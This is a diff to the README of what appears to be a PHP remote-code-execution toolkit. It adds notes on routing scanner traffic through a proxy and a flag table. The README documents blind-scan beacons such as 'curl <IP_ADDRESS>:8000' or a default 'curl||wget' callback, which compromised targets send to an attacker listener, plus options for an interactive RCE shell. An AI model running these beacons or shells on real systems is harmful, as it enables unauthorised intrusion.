@@ -265,6 +265,17 @@ Networking notes:
 - the beacon must reach the listener: on the same LAN use your host IP
   (`--ip` to pin it); otherwise the source IP is auto-detected per target
   from the routing table.
+- **use `--proxy`, not `proxychains`**: `proxychains` intercepts every TCP
+  connection the process makes — including a loopback lab target
+  (`127.0.0.1:18081`), which the proxy then resolves on *its* side and
+  fails (`UNREACHABLE`), and the raw-socket traffic of these scripts is not
+  what proxychains expects. `--proxy http://[user:pass@]host:port` or
+  `--proxy socks5://host:port` (CONNECT/SOCKS5, remote DNS) routes only
+  scanner->target traffic, so a local lab needs no proxy at all and remote
+  targets go through yours.
+  Note that beacons do NOT go through the proxy: the target connects to the
+  listener directly, so the address in `--beacon` must be reachable from the
+  target (set `--ip` to the same address).
 - **custom beacons**: `--beacon 'curl <IP_ADDRESS>:8000'` replaces the
   built-in `curl||wget`+tags command with your own; the placeholders
   `<IP_ADDRESS>` (or `<IP>`), `<PORT>` and `<TAG>` are substituted. Without
@@ -337,6 +348,8 @@ chainb/Dockerfile.asan    PHP 8.2.34 built from source with AddressSanitizer
 | `--hosts FILE`, `--workers N`, `--timeout S` | scan | Target list, thread pool size, per-request timeout |
 | `--gadget CLASS`, `--gadget-prop NAME` | scan | Preloaded destruct gadget class for chain C |
 | `--json FILE`, `--log FILE`, `--quiet`, `--verify-tls` | scan | Output files, vulnerable-target log, TLS behavior |
+| `--proxy URL` | scan | Route scanner->target traffic via `http://` CONNECT or `socks5://` |
+| `--beacon CMD`, `--ip IP`, `--listen-port N` | scan_blind | Custom beacon template (`<IP_ADDRESS>`, `<PORT>`, `<TAG>`), attacker IP, listener port |
 | `--chain {a,c}` | rce_shell | Which chain drives the interactive shell |
 | `--lfi-path`, `--lfi-param`, `--save-path` | A, shell a | Adjust to the target's LFI endpoint and session directory |
 | `--write-path`, `--read-path`, `--output-path` | C, shell c | Adjust to the target's two handler endpoints and proof path |
